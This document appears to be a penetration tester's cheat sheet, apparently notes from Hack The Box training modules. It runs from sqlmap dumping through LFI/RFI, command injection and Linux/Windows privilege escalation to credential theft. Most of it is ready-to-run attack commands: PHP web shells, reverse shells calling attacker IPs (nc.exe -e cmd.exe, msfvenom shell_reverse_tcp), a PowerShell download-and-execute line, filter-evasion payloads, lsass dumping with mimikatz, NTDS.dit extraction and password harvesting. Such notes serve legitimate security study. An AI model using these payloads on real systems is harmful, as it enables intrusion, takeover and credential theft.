    - sqlmap -u "[http://www.example.com/?id=1](http://www.example.com/?id=1)" --dump -T users -D testdb --where="name LIKE 'f%'"
- Full DB Enumeration
    - (e.g. --dump -D testdb).  --dump without specifying a table with -T, all of the current database content will be retrieved. As for the --dump-all switch, all the content from all the databases will be retrieved.
    - In such cases, a user is also advised to include the switch --exclude-sysdbs (e.g. --dump-all --exclude-sysdbs), which will instruct SQLMap to skip the retrieval of content from system databases, as it is usually of little interest for pentesters.
- Advance
    - sqlmap -u "[http://www.example.com/?id=1](http://www.example.com/?id=1)" --schema
    - sqlmap -u "[http://www.example.com/?id=1](http://www.example.com/?id=1)" --search -T user
    - sqlmap -u "[http://www.example.com/?id=1](http://www.example.com/?id=1)" --search -C pass
    - sqlmap -u "[http://www.example.com/?id=1](http://www.example.com/?id=1)" --dump -D master -T users
    - sqlmap -u "[http://www.example.com/?id=1](http://www.example.com/?id=1)" --passwords --batch
    - Tip: The '--all' switch in combination with the '--batch' switch, will automa(g)ically do the whole enumeration process on the target itself, and provide the entire enumeration details.
- Anti-CSRF Token Bypass
    - sqlmap -u "[http://www.example.com/](http://www.example.com/)" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
- Unique Value Bypass
    - sqlmap -u "[http://www.example.com/?id=1&rp=29125](http://www.example.com/?id=1&rp=29125)" --randomize=rp --batch -v 5 | grep URI
- Calculated Parameter Bypass
    - sqlmap -u "[http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b](http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b)" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
- OS Exploitation
    - Checking for DBA Privileges
        - sqlmap -u "[http://www.example.com/case1.php?id=1](http://www.example.com/case1.php?id=1)" --is-dba
    - sqlmap -u "[http://www.example.com/?id=1](http://www.example.com/?id=1)" --file-read "/etc/passwd"
    - Writing Local Files
        - echo '<?php system($_GET["cmd"]); ?>' > shell.php
        - sqlmap -u "[http://www.example.com/?id=1](http://www.example.com/?id=1)" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
        - curl [http://www.example.com/shell.php?cmd=ls+-la](http://www.example.com/shell.php?cmd=ls+-la)
    - OS Command Execution
        - sqlmap -u "[http://www.example.com/?id=1](http://www.example.com/?id=1)" --os-shell
        - sqlmap -u "[http://www.example.com/?id=1](http://www.example.com/?id=1)" --os-shell --technique=E

## File Inclusions

- Path Traversal
    - ../../../../etc/passwd
    - /../../../etc/passwd
- Non-Recursive Path Traversal Filters
    - ...//....//....//....//etc/passwd
- Encoding
- PHP Filters
    - ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
    - Tip: Unlike normal web application usage, we are not restricted to pages with HTTP response code 200, as we have local file inclusion access, so we should be scanning for all codes, including `301`, `302` and `403` pages, and we should be able to read their source code as well.
    - php://filter/read=convert.base64-encode/resource=config
    - http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
- PHP Wrappers
    - "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
    - echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
    - echo '<?php system($_GET["cmd"]); ?>' | base64
    - Data wrapper
        - http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
    - Input wrapper
        - curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
    - Expect
        - echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
        - curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id”
- RFI
    - echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
    - echo '<?php system($_GET["cmd"]); ?>' > shell.php
    - sudo python3 -m http.server <LISTENING_PORT>
    - http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
    - FTP
        - sudo python -m pyftpdlib -p 21
        - http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
    - SMB
        - impacket-smbserver -smb2support share $(pwd)
        - http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
- LFI and File Uploads
    - FIle upload
    - Zip Upload
    - Phar upload
- Log Poisoning
- Automated scanning
    - Parameter
        - ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
    - LFI wordlist
        - ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
    - ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
    - ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287

## File Upload Attacks

- File Upload Attacks
    - phpbash.php
    - https://github.com/pentestmonkey/php-reverse-shell
- Fuzzing extension
- Double Extensions
    - [https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)
    - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload Insecure Files/Extension PHP/extensions.lst](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)
    - [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)

## Command Injections

| Injection Operator | Injection Character | URL-Encoded Character | Executed Command |
| --- | --- | --- | --- |
| Semicolon | ; | %3b | Both |
| New Line | \n | %0a | Both |
| Background | & | %26 | Both (second output generally shown first) |
| Pipe | | | %7c | Both (only second output is shown) |
| AND | && | %26%26 | Both (only if first succeeds) |
| OR | || | %7c%7c | Second (only if first fails) |
| Sub-Shell | `` | %60%60 | Both (Linux-only) |
| Sub-Shell | $() | %24%28%29 | Both (Linux-only) |

| Injection Type | Operators |
| --- | --- |
| SQL Injection | ' , ; -- /* */ |
| Command Injection | ; && |
| LDAP Injection | * ( ) & | |
| XPath Injection | ' or and not substring concat count |
| OS Command Injection | ; & | |
| Code Injection | ' ; -- /* */ $() ${} #{} %{} ^ |
| Directory Traversal/File Path Traversal | ../ ..\\ %00 |
| Object Injection | ; & | |
| XQuery Injection | ' ; -- /* */ |
| Shellcode Injection | \x \u %u %n |
| Header Injection | \n \r\n \t %0d %0a %09 |
- AND (&&) operator
- OR (||) injection operator
- Bypassing Space Filters
    - New line character
    - Bypass Blacklisted Spaces
        - Using Tabs (%09)
    - Using $IFS
    - Using Brace Expansion 127.0.0.1%0a{ls,-la}
- Bypassing Other Blacklisted Characters
    - use environment variables to add a semi-colon and a space to our payload (127.0.0.1${LS_COLORS:10:1}${IFS}
- Bypassing Blacklisted Commands
    - w'h'o'am'i
    - w"h"o"am"i
    - who$@ami
    - w\ho\am\i
    - windows -who^ami
- Advanced Command Obfuscation
    - Case Manipulation
    - $(rev<<<'imaohw')
    - bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
- Bashfuscator
- DOSfuscation

## Linux PrivEsc

- https://github.com/rebootuser/LinEnum
- List Current Processes
    - ps aux | grep root
- Home Directory Contents
    - ls /home
- User's Home Directory Contents
    - ls -la /home/stacey.jenkins/
- SSH Directory Contents
    - ls -l ~/.ssh
- Bash History
    - history
- Sudo - List User's Privileges
    - sudo -l
- Passwd
    - cat /etc/passwd
- Cron Jobs
    - ls -la /etc/cron.daily/
- File Systems & Additional Drives
    - lsblk
- Find Writable Directories
    - find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
- Find Writable Files
    - find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
- cat /etc/os-release
- echo $PATH
- env
- uname -a
- CPU type/version
    - lscpu
- cat /etc/shells
- domain environment we'll definitely want to check /etc/resolv.conf
- arp -a
- cat /etc/passwd | cut -f1 -d:
- grep "*sh$" /etc/passwd
- cat /etc/group
- List member of group
    - getent group sudo
- Mounted File Systems
    - df -h
- Unmounted File Systems
    - cat /etc/fstab | grep -v "#" | column -t
- All Hidden Files
    - find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student
- All Hidden Directories
    - find / -type d -name ".*" -ls 2>/dev/null
- Temporary Files
    - ls -l /tmp /var/tmp /dev/shm
- Network Interfaces
    - ip a
- Hosts
    - cat /etc/hosts
- User's Last Login
    - lastlog
- Logged In Users
    - who
    - w
    - finger
- Finding History Files
    - find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
- Cron
    - ls -la /etc/cron.daily/
- Proc
    - find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n”
- Installed Packages
    - apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
- Sudo Version
    - sudo -V
- Binaries
    - ls -l /bin /usr/bin/ /usr/sbin/
- GTFObins
    - for i in $(curl -s [https://gtfobins.github.io/](https://gtfobins.github.io/) | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
- Trace System Calls
    - strace ping -c1 10.129.112.20
- Configuration Files
    - find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
- Scripts
    - find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share”
- Running Services by User
    - ps aux | grep root
- Credential Hunting
    - cat wp-config.php | grep 'DB_USER\|DB_PASSWORD’
    - find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
    - ls ~/.ssh
- Path Abuse
    - echo $PATH
    - Adding current directory to path
        - PATH=.:$PATH and then export PATH
- Wildcard Abuse
    
    
    | Character | Significance |
    | --- | --- |
    | * | An asterisk that can match any number of characters in a file name. |
    | ? | Matches a single character. |
    | [ ] | Brackets enclose characters and can match any single one at the defined position. |
    | ~ | A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory. |
    | - | A hyphen within brackets will denote a range of characters. |
    - tar abuse
    - (--checkpoint-action) permits exec action to be execture
    - (-checkpoint=1 and --checkpoint-action=exec=sh [root.sh](http://root.sh/) is passed to tar as command-line options)
    
    ```xml
    #
    #
    mh dom mon dow command
    */01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
    ```
    
    ```xml
    htb-student@NIX02:~$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
    htb-student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
    htb-student@NIX02:~$ echo "" > --checkpoint=1
    ```
    
- Escaping Restricted Shells
    - ls -l ‘pwd’
- Special Permissions
    - find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
    - find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
- GTFOBins
    - sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
- Sudo Rights Abuse
    - sudo -l
- Privileged Groups
    - LXC / LXD
- Capabilities
    - Enumerating Capabilities
        - find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
- Vulnerable Services
    - Screen version
- Cron Job Abuse
    - find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
- Logrotate
    - *Suggestion if you want to learn more*: Now, many people encounter a problem: the reverse shell quickly dies. For the module it is more than enough just to quickly type and read the flag. But what I would like to do (for example, if I find a machine that is vulnerable to this exploit and the shell quickly dies) is, for example, to give `SUID` permissions to the `bash`. So I copy the command `chmod 4777 $(which bash)` in my machine and keep it on my clipboard, re-execute `logrotten` exploit with `nc` previously listening, and in the rev. shell as `root` I quickly past and execute the command above.
    - If this worked and you type `ls -la $(which bash)` you should see the output `-rwsrwxrwx`m where the important thing there is the `s` (indicating that the binary has now `SUID` permissions). If the reverse shell dies now it does not matter, since the `bash` has `SUID` permissions and in SSH session we can type `bash -p` and become `root`
- Weak NFS Privileges
- cat /etc/exports
- Hijacking Tmux Sessions

## Windows PrivEsc

- Tools
    - winpeas
    - lazange
    - sharpup
    - upload tools to C:\Windows\Temp
- Interface(s), IP Address(es), DNS Information
    - ipconfig /all
- ARP Table
    - arp -a
- Routing Table
    - route print
- Enumerating Protections
    - Check Windows Defender Status
        - Get-MpComputerStatus
    - List AppLocker Rules
        - Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
    - Test AppLocker Policy
        - Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
- Tasklist
    - tasklist /svc
- Environment Variables
    - set
- systeminfo
    - systeminfo
- Patches and Updates
    - wmic qfe
    - Get-HotFix | ft -AutoSize
- Installed Programs
    - wmic product get name
    - Get-WmiObject -Class Win32_Product | select Name, Version
- Display Running Processes
    - netstat -ano
- Logged-In Users
    - query user
- Current User
    - echo %USERNAME%
- Current User Privileges
    - whoami /priv
- Current User Group Information
    - whoami /groups
- Get All Users
    - net user
- Get All Groups
    - net localgroup
- Details About a Group
    - net localgroup administrators
- Get Password Policy & Other Account Information
    - net accounts
- Display Active Network Connections
    - netstat -ano
- Named Pipes
    - Listing Named Pipes with Pipelist
        - pipelist.exe /accepteula
    - Listing Named Pipes with PowerShell
        - gci \\.\pipe\
    - Reviewing LSASS Named Pipe Permissions
        - accesschk.exe /accepteula \\.\Pipe\lsass -v

## Windows Privileges

- SeImpersonate and SeAssignPrimaryToken
    - [mssqlclient.py](http://mssqlclient.py/) [sql_dev@10.129.43.30](mailto:sql_dev@10.129.43.30) -windows-auth
    - enable_xp_cmdshell
    - xp_cmdshell whoami /priv
    - xp_cmdshell whoami /priv
    - Escalating Privileges Using JuicyPotato
    - xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
    - sudo nc -lnvp 8443
    - JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards.
    - —
    - PrintSpoofer and RoguePotato
        - xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd”
- SeDebugPrivilege
    - procdump.exe -accepteula -ma lsass.exe lsass.dmp
    - mimikatz.exe
        - log
        - sekurlsa::minidump lsass.dmp
        - sekurlsa::logonpasswords
    - Create dump file
    - Remote Code Execution as SYSTEM
        - https://github.com/decoder-it/psgetsystem
        - tasklist
        - .\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")
        - winlogon.exe running under PID 612
        - .\psgetsys.ps1; [MyProcess]::CreateProcessFromParent((Get-Process “lsass”).Id, ”C:\Windows\System32\cmd.exe”,"")
        - [https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- SeTakeOwnershipPrivilege
    - SeBackupPrivilege, SeRestorePrivilege, and SeSecurityPrivilege
    - https://github.com/FSecureLABS/SharpGPOAbuse
    - Reviewing Current User Privileges
        - whoami /priv
    - Enabling SeTakeOwnershipPrivilege
        - [https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1)
        - Import-Module .\Enable-Privilege.ps1
        - .\EnableAllTokenPrivs.ps1
        - whoami /priv
    - Choosing a Target File
        - Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
    - Checking File Ownership
        - cmd /c dir /q 'C:\Department Shares\Private\IT’
    - Taking Ownership of the File
        - takeown /f 'C:\Department Shares\Private\IT\cred.txt’
    - Confirming Ownership Changed
        - Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
    - Modifying the File ACL
        - cat 'C:\Department Shares\Private\IT\cred.txt’
        - icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
    - Reading the File
        - cat 'C:\Department Shares\Private\IT\cred.txt’
    - When to Use?
        
        ```xml
        c:\inetpub\wwwwroot\web.config
        %WINDIR%\repair\sam
        %WINDIR%\repair\system
        %WINDIR%\repair\software, %WINDIR%\repair\security
        %WINDIR%\system32\config\SecEvent.Evt
        %WINDIR%\system32\config\default.sav
        %WINDIR%\system32\config\security.sav
        %WINDIR%\system32\config\software.sav
        %WINDIR%\system32\config\system.sav
        ```
        
- Backup Operators
    - whoami /groups
    - SeBackup and SeRestore privileges
    - https://github.com/giuliano108/SeBackupPrivilege
    - Import-Module .\SeBackupPrivilegeCmdLets.dll
    - Import-Module .\SeBackupPrivilegeCmdLets.dll
    - Verifying SeBackupPrivilege is Enabled
        - Get-SeBackupPrivilege
        - Set-SeBackupPrivilege
    - Copying a Protected File
        - Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
    - Attacking a Domain Controller - Copying NTDS.dit
        - Windows diskshadow utility to create a shadow copy of the C drive and expose it as E drive
        
        ```xml
        PS C:\htb> diskshadow.exe
        
        Microsoft DiskShadow version 1.0
        Copyright (C) 2013 Microsoft Corporation
        On computer:  DC,  10/14/2020 12:57:52 AM
        
        DISKSHADOW> set verbose on
        DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
        DISKSHADOW> set context clientaccessible
        DISKSHADOW> set context persistent
        DISKSHADOW> begin backup
        DISKSHADOW> add volume C: alias cdrive
        DISKSHADOW> create
        DISKSHADOW> expose %cdrive% E:
        DISKSHADOW> end backup
        DISKSHADOW> exit
        ```
        
    - Copying NTDS.dit Locally
        - Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
    - 
        - reg save HKLM\SYSTEM SYSTEM.SAV
        - reg save HKLM\SAM SAM.SAV
    - Extracting Credentials from NTDS.dit
        - Import-Module .\DSInternals.psd1
        - $key = Get-BootKey -SystemHivePath .\SYSTEM
        - Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
        - OUR HOST - [secretsdump.py](http://secretsdump.py/) -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
    - Robocopy
        - robocopy /B E:\Windows\NTDS .\ntds ntds.dit
- Event Log Readers
    - Confirming Group Membership
        - net localgroup "Event Log Readers”
    - Searching Security Logs Using wevtutil
        - wevtutil qe Security /rd:true /f:text | Select-String "/user”
        - wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user”
    - Searching Security Logs Using Get-WinEvent
        - Get-WinEvent -LogName security | where { $*.ID -eq 4688 -and $*.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
    - Powershell Operation Log
- DnsAdmins
    - msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
    - python3 -m http.server 7777
    - wget "[http://10.10.14.3:7777/adduser.dll](http://10.10.14.3:7777/adduser.dll)" -outfile "adduser.dll"
    - Loading DLL as Non-Privileged
        - dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
    - Loading DLL as Member of DnsAdmins
        - Get-ADGroupMember -Identity DnsAdmins
    - Loading Custom DLL
        - dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
    - Finding User's SID
        - wmic useraccount where name="netadm" get sid
    - Checking Permissions on DNS Service
        - sc.exe sdshow DNS
    - Stopping the DNS Service
        - sc stop dns
    - Starting the DNS Service
        - sc start dns
    - Confirming Group Membership
        - net group "Domain Admins" /dom
- Hyper-V Administrators
- Print Operators
- Server Operators
- User Account Control
    - default RID 500 administrator
    - net localgroup administrators
    - whoami /priv
    - Confirming UAC is Enabled
        - REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
    - Checking UAC Level
        - REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
    - Checking Windows Version
        - [environment]::OSVersion.Version
    - [https://en.wikipedia.org/wiki/Windows_10_version_history](https://en.wikipedia.org/wiki/Windows_10_version_history)
    - https://github.com/hfiref0x/UACME- list of UAC bypasses
    - Reviewing Path Variable
        - cmd /c echo %PATH%
    - msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
    - sudo python3 -m http.server 8080
    - curl [http://10.10.14.3:8080/srrstr.dll](http://10.10.14.3:8080/srrstr.dll) -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
    - Testing Connection
        - rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
    - Executing SystemPropertiesAdvanced.exe on Target Host
        - C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
    - gpupdate /force
- Weak permissions
    - Permissive File System ACLs
        - Running SharpUp
            - .\SharpUp.exe audit
        - Checking Permissions with icacls
            - icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe”
        - Replacing Service Binary
            - msfvenom
            - cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe”
            - sc start SecurityService
    - Weak Service Permissions
        - accesschk.exe /accepteula -quvcw WindscribeService
        - Check Local Admin Group
            - net localgroup administrators
        - Changing the Service Binary Path
            - sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add”
        - Stopping Service
            - sc stop WindscribeService
        - Starting the Service
            - sc start WindscribeService
        - Confirming Local Admin Group Addition
            - net localgroup administrators
    - Weak Service Permissions - Cleanup
        - sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe”
        - sc start WindScribeService
        - sc query WindScribeService
    - Unquoted Service Path
        - Service Binary Path
            - binary is not encapsulated within quotes
            - C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
        - Querying Service
            - sc qc SystemExplorerHelpService
        - Searching for Unquoted Service Paths
            - wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v ""”
        - Checking for Weak Service ACLs in Registry
            - accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
        - Changing ImagePath with PowerShell
            - Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443”
        - Check Startup Programs
            - Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
- Kernel Exploits
    - [https://msrc.microsoft.com/update-guide/vulnerability](https://msrc.microsoft.com/update-guide/vulnerability)
    - Checking Permissions on the SAM File
        - icacls c:\Windows\System32\config\SAM
    - Performing Attack and Parsing Password Hashes
        - https://github.com/GossiTheDog/HiveNightmare
        - .\HiveNightmare.exe
        - impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local
    - Enumerating Missing Patches
        - systeminfo
        
        - wmic qfe list brief
        - Get-Hotfix
- Vulnerable Services
    - Enumerating Installed Programs
        - wmic product get name
    - Enumerating Local Ports
        - netstat -ano | findstr 6064
    - Enumerating Process ID
        - get-process -Id 3324
    - Enumerating Running Service
        - get-service | ? {$_.DisplayName -like 'Druva*'}
    - [https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
    - `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443`
    - `$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"`
    - Set-ExecutionPolicy Bypass -Scope Process
    - [https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/)

### Credential Theft

- PS C:\htb> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
- IIS C:\inetpub\wwwroot\web.config
- Chrome Dictionary Files
    - PS C:\htb> gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
- Unattended Installation Files
    - unattend.xml
- PowerShell History File
    - C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt.
    - PS C:\htb> (Get-PSReadLineOption).HistorySavePath
    - PS C:\htb> gc (Get-PSReadLineOption).HistorySavePath
    - PS C:\htb> foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
- PowerShell Credentials
    - $credential = Import-Clixml -Path 'C:\scripts\pass.xml’
    - $credential.GetNetworkCredential().username
    - $credential.GetNetworkCredential().password
- Search File Contents for String - Example 1
    - C:\htb> cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt
- Search File Contents for String - Example 2
    - C:\htb> findstr /si password *.xml *.ini *.txt *.config
- Search File Contents for String - Example 3
    - C:\htb> findstr /spin "password" *.*
- Search File Contents with PowerShell
    - PS C:\htb> select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
- Search for File Extensions - Example 1
    - C:\htb> dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
- Search for File Extensions - Example 2
    - C:\htb> where /R C:\ *.config
- Search for File Extensions Using PowerShell
    - PS C:\htb> Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
- findstr /spin "ldapadmin" *.*

> Get-ChildItem -Recurse -Filter [filtype] | Select-String -Pattern [searchterm] -CaseSensitive:$false | Select-Object -Property Path
> 
- Sticky Notes Passwords
    - C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
- Looking for StickyNotes DB Files
    - PS C:\htb> ls
    
    ```
    Directory: C:\\Users\\htb-student\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState
    
    ```
    
    - We can copy the three plum.sqlite* files down to our system and open them with a tool such as DB Browser for SQLite and view the Text column in the Note table with the query `select Text from Note;`
- Viewing Sticky Notes Data Using PowerShell
    - PS C:\htb> Set-ExecutionPolicy Bypass -Scope Process
    - PS C:\htb> cd .\PSSQLite\
    - PS C:\htb> Import-Module .\PSSQLite.psd1
    - PS C:\htb> $db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite’
    - PS C:\htb> Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
- Strings to View DB File Contents
    - strings plum.sqlite-wal
- Other Files of Interest
    
    ```powershell
    %SYSTEMDRIVE%\pagefile.sys
    %WINDIR%\debug\NetSetup.log
    %WINDIR%\repair\sam
    %WINDIR%\repair\system
    %WINDIR%\repair\software, %WINDIR%\repair\security
    %WINDIR%\iis6.log
    %WINDIR%\system32\config\AppEvent.Evt
    %WINDIR%\system32\config\SecEvent.Evt
    %WINDIR%\system32\config\default.sav
    %WINDIR%\system32\config\security.sav
    %WINDIR%\system32\config\software.sav
    %WINDIR%\system32\config\system.sav
    %WINDIR%\system32\CCM\logs\*.log
    %USERPROFILE%\ntuser.dat
    %USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
    %WINDIR%\System32\drivers\etc\hosts
    C:\ProgramData\Configs\*
    C:\Program Files\Windows PowerShell\*
    ```
    
- Further credential theft
    - Cmdkey Saved Credentials
        - C:\htb> cmdkey /list
    - Run Commands as Another User
        - PS C:\htb> runas /savecred /user:inlanefreight\bob "COMMAND HERE”
    - Browser Credentials
        - PS C:\htb> .\SharpChrome.exe logins /unprotect
    - Password Managers
        - vnk50@htb[/htb]$ python2.7 [keepass2john.py](http://keepass2john.py/) ILFREIGHT_Help_Desk.kdbx
        - vnk50@htb[/htb]$ hashcat -m 13400 keepass_hash /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt
    - Email
        - https://github.com/dafthack/MailSniper
    - LaZagne
        - PS C:\htb> .\lazagne.exe all
    - Running SessionGopher as Current User
        - PS C:\htb> Import-Module .\SessionGopher.ps1
        - PS C:\Tools> Invoke-SessionGopher -Target WINLPE-SRV01
    - Windows AutoLogon
